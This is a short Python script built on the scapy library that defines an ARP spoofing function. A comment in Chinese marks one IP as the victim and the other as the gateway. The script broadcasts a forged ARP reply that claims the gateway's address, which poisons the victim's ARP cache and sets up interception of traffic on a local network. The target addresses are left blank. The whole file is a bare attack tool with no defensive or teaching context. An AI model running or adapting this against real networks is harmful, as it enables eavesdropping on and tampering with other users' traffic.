#!/usr/bin/python
#!coding:utf-8
from scapy.all import *
def arpspoof(ip1,ip2): #ip1为欺骗对象，ip2为网关
	pkt=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=ip2,pdst=ip1)
	sendp(pkt)
	return

def main():
	ip1=''
	ip2=''
	arpspoof(ip1,ip2) 
if __name__ == '__main__':
	main()
